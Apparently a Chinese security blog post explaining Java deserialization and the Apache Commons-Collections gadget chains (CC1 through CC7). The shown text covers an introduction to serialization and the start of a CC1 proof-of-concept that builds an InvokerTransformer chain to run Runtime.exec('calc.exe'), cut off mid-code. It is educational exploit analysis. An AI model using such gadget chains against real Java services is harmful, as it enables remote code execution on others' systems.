<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾ Javaååºåˆ—åŒ– ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– å¦‚æœæˆ‘ä»¬éœ€è¦æŒä¹…åŒ– Java å¯¹è±¡æ¯”å¦‚å°† Java å¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ç½‘ç»œä¼ è¾“ Java å¯¹è±¡ï¼Œè¿™äº›åœºæ™¯éƒ½éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚æµçš„è¿‡ç¨‹ ååºåˆ—åŒ–ï¼šå°†åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ç”Ÿæˆçš„äºŒè¿›åˆ¶å­—èŠ‚æµè½¬æ¢æˆæ•°æ®ç»“æ„æˆ–è€…å¯¹è±¡çš„è¿‡ç¨‹ ä¸‹é¢æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¸¸è§åº”ç”¨åœºæ™¯ï¼š\n"><meta name=keywords content="CommonsCollections,Javaååºåˆ—åŒ–"><title>ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾</title><link rel=canonical href=https://lantern-lab.github.io/post/java-derivativeization-zj7e3h.html><link rel=stylesheet href=/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css><meta property='og:title' content="ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾"><meta property='og:description' content="ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾ Javaååºåˆ—åŒ– ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– å¦‚æœæˆ‘ä»¬éœ€è¦æŒä¹…åŒ– Java å¯¹è±¡æ¯”å¦‚å°† Java å¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ç½‘ç»œä¼ è¾“ Java å¯¹è±¡ï¼Œè¿™äº›åœºæ™¯éƒ½éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚æµçš„è¿‡ç¨‹ ååºåˆ—åŒ–ï¼šå°†åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ç”Ÿæˆçš„äºŒè¿›åˆ¶å­—èŠ‚æµè½¬æ¢æˆæ•°æ®ç»“æ„æˆ–è€…å¯¹è±¡çš„è¿‡ç¨‹ ä¸‹é¢æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¸¸è§åº”ç”¨åœºæ™¯ï¼š\n"><meta property='og:url' content='https://lantern-lab.github.io/post/java-derivativeization-zj7e3h.html'><meta property='og:site_name' content='é­”ä»™æ£’æ£’ä¹‹ä¸»'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CommonsCollections'><meta property='article:tag' content='Javaååºåˆ—åŒ–'><meta property='article:published_time' content='2024-09-04T01:24:26+08:00'><meta property='article:modified_time' content='2024-10-04T02:24:39+08:00'><meta property='og:image' content='https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg'><meta name=twitter:title content="ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾"><meta name=twitter:description content="ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾ Javaååºåˆ—åŒ– ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– å¦‚æœæˆ‘ä»¬éœ€è¦æŒä¹…åŒ– Java å¯¹è±¡æ¯”å¦‚å°† Java å¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ç½‘ç»œä¼ è¾“ Java å¯¹è±¡ï¼Œè¿™äº›åœºæ™¯éƒ½éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚æµçš„è¿‡ç¨‹ ååºåˆ—åŒ–ï¼šå°†åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ç”Ÿæˆçš„äºŒè¿›åˆ¶å­—èŠ‚æµè½¬æ¢æˆæ•°æ®ç»“æ„æˆ–è€…å¯¹è±¡çš„è¿‡ç¨‹ ä¸‹é¢æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¸¸è§åº”ç”¨åœºæ™¯ï¼š\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg'><link rel="shortcut icon" href=/pokeball.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar2_hu_4b486bc0b2290a89.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¤”</span></figure><div class=site-meta><h1 class=site-name><a href=/>é­”ä»™æ£’æ£’ä¹‹ä¸»</a></h1><h2 class=site-description>æ˜¥å›° å¤å€¦ ç§‹ä¹ å†¬çœ </h2></div></header><ol class=menu-social><li><a href=https://github.com/lantern-lab/lantern-lab.github.io target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href='https://blog.csdn.net/qq_40487134?type=blog' target=_blank title=CSDN rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-trash"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7h16"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M5 7l1 12a2 2 0 002 2h8a2 2 0 002-2l1-12"/><path d="M9 7V4a1 1 0 011-1h4a1 1 0 011 1v3"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href=#commonscollections1>CommonsCollections1</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#transformermapé“¾>TransformerMapé“¾</a><ol><li><a href=#pocå±•ç¤º>PoCå±•ç¤º</a></li><li><a href=#pocè°ƒç”¨åˆ†æ>PoCè°ƒç”¨åˆ†æ</a></li><li><a href=#pocæ„é€ åˆ†æ>PoCæ„é€ åˆ†æ</a></li><li><a href=#expæ„é€ åˆ†æ>Expæ„é€ åˆ†æ</a></li></ol></li><li><a href=#lazymapé“¾>LazyMapé“¾</a><ol><li><a href=#expå±•ç¤º>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-1>Expæ„é€ åˆ†æ</a></li></ol></li></ol></li><li><a href=#commonscollections2>CommonsCollections2</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-1>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#priorityqueueé“¾>PriorityQueueé“¾</a><ol><li><a href=#expå±•ç¤º-1>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-2>Expæ„é€ åˆ†æ</a></li><li><a href=#é—®é¢˜è¡¥å……>é—®é¢˜è¡¥å……</a></li></ol></li><li><a href=#treebagtreemapé“¾>TreeBag&amp;TreeMapé“¾</a><ol><li><a href=#expå±•ç¤º-2>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-3>Expæ„é€ åˆ†æ</a></li><li><a href=#é—®é¢˜è¡¥å……-1>é—®é¢˜è¡¥å……</a></li></ol></li></ol></li><li><a href=#commonscollections3>CommonsCollections3</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-2>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#expå±•ç¤º-3>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-4>Expæ„é€ åˆ†æ</a><ol><li><a href=#åˆ©ç”¨é“¾å±•ç¤º-2>åˆ©ç”¨é“¾å±•ç¤º</a></li><li><a href=#traxfilter>TrAXFilter</a></li><li><a href=#instantiatetransformer>InstantiateTransformer</a></li></ol></li></ol></li><li><a href=#commonscollections4>CommonsCollections4</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-3>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#expå±•ç¤º-4>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-5>Expæ„é€ åˆ†æ</a><ol><li><a href=#åˆ©ç”¨é“¾å±•ç¤º-3>åˆ©ç”¨é“¾å±•ç¤º</a></li></ol></li><li><a href=#é—®é¢˜è¡¥å……-2>é—®é¢˜è¡¥å……</a><ol><li><a href=#æ˜¯å¦èƒ½ç”¨treebagtreemapæ„é€ >æ˜¯å¦èƒ½ç”¨TreeBag&amp;TreeMapæ„é€ </a></li></ol></li></ol></li><li><a href=#commonscollections5>CommonsCollections5</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-4>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#expå±•ç¤º-5>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-6>Expæ„é€ åˆ†æ</a><ol><li><a href=#åˆ©ç”¨é“¾å±•ç¤º-4>åˆ©ç”¨é“¾å±•ç¤º</a></li><li><a href=#badattributevalueexpexception>BadAttributeValueExpException</a></li><li><a href=#tiedmapentry>TiedMapEntry</a></li></ol></li></ol></li><li><a href=#commonscollections6>CommonsCollections6</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-5>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#expå±•ç¤º-6>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-7>Expæ„é€ åˆ†æ</a><ol><li><a href=#åˆ©ç”¨é“¾å±•ç¤º-5>åˆ©ç”¨é“¾å±•ç¤º</a></li><li><a href=#hashset>HashSet</a></li><li><a href=#hashmap>HashMap</a></li><li><a href=#tiedmapentry-1>TiedMapEntry</a></li><li><a href=#lazymap-1>LazyMap</a></li></ol></li><li><a href=#é—®é¢˜è¡¥å……-3>é—®é¢˜è¡¥å……</a><ol><li><a href=#lazymapremovecc6>lazyMap.remove(&ldquo;cc6&rdquo;)</a></li><li><a href=#testtransformer>Testtransformer</a></li></ol></li></ol></li><li><a href=#commonscollections7>CommonsCollections7</a><ol><li><a href=#ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-6>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</a></li><li><a href=#expå±•ç¤º-7>Expå±•ç¤º</a></li><li><a href=#expæ„é€ åˆ†æ-8>Expæ„é€ åˆ†æ</a><ol><li><a href=#åˆ©ç”¨é“¾å±•ç¤º-6>åˆ©ç”¨é“¾å±•ç¤º</a></li><li><a href=#hashtable>Hashtable</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/post/java-derivativeization-zj7e3h.html><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg loading=lazy alt="Featured image of post ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾"></a></div><div class=article-details><header class=article-category><a href=/categories/java/>Java</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/post/java-derivativeization-zj7e3h.html>ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2024/09/04</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>é˜…è¯»æ—¶é•¿: 39 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><h1 id=javaååºåˆ—åŒ–commonscollectionsé“¾>ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾</h1><h1 id=javaååºåˆ—åŒ–>Javaååºåˆ—åŒ–</h1><h2 id=ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2><p>å¦‚æœæˆ‘ä»¬éœ€è¦æŒä¹…åŒ– Java å¯¹è±¡æ¯”å¦‚å°† Java å¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ç½‘ç»œä¼ è¾“ Java å¯¹è±¡ï¼Œè¿™äº›åœºæ™¯éƒ½éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚</p><ul><li><strong>åºåˆ—åŒ–</strong>ï¼šå°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚æµçš„è¿‡ç¨‹</li><li><strong>ååºåˆ—åŒ–</strong>ï¼šå°†åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ç”Ÿæˆçš„äºŒè¿›åˆ¶å­—èŠ‚æµè½¬æ¢æˆæ•°æ®ç»“æ„æˆ–è€…å¯¹è±¡çš„è¿‡ç¨‹</li></ul><p>ä¸‹é¢æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¸¸è§åº”ç”¨åœºæ™¯ï¼š</p><ul><li>å¯¹è±¡åœ¨è¿›è¡Œç½‘ç»œä¼ è¾“ï¼ˆæ¯”å¦‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ RPC çš„æ—¶å€™ï¼‰ä¹‹å‰éœ€è¦å…ˆè¢«åºåˆ—åŒ–ï¼Œæ¥æ”¶åˆ°åºåˆ—åŒ–çš„å¯¹è±¡ä¹‹åéœ€è¦å†è¿›è¡Œååºåˆ—åŒ–ï¼›</li><li>å°†å¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶ä¹‹å‰éœ€è¦è¿›è¡Œåºåˆ—åŒ–ï¼Œå°†å¯¹è±¡ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥éœ€è¦è¿›è¡Œååºåˆ—åŒ–ï¼›</li><li>å°†å¯¹è±¡å­˜å‚¨åˆ°æ•°æ®åº“ï¼ˆå¦‚ Redisï¼‰ä¹‹å‰éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ï¼Œå°†å¯¹è±¡ä»ç¼“å­˜æ•°æ®åº“ä¸­è¯»å–å‡ºæ¥éœ€è¦ååºåˆ—åŒ–ï¼›</li><li>å°†å¯¹è±¡å­˜å‚¨åˆ°å†…å­˜ä¹‹å‰éœ€è¦è¿›è¡Œåºåˆ—åŒ–ï¼Œä»å†…å­˜ä¸­è¯»å–å‡ºæ¥ä¹‹åéœ€è¦è¿›è¡Œååºåˆ—åŒ–ã€‚</li></ul><p>ç»¼ä¸Šï¼š<strong>åºåˆ—åŒ–çš„ä¸»è¦ç›®çš„æ˜¯é€šè¿‡ç½‘ç»œä¼ è¾“å¯¹è±¡æˆ–è€…è¯´æ˜¯å°†å¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ã€å†…å­˜ä¸­ã€‚</strong></p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240915163123-109rbae.png loading=lazy alt=image>â€‹</p><h2 id=commonscollections1>CommonsCollections1</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>Commons-Collections 3.1-3.2.1</p><p>Java JDK &lt; 8u71</p><h3 id=transformermapé“¾>TransformerMapé“¾</h3><h4 id=pocå±•ç¤º>PoCå±•ç¤º</h4><p>è¿™æ˜¯ä¸€æ®µPoCï¼Œè¿è¡Œåä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example.cc</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.TransformedMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections1</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>transformers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;getMethod&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;getRuntime&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=p>}),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;calc.exe&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=w> </span><span class=n>transformerChain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>transformers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>innerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>innerMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;value&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;hack&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span><span class=w>
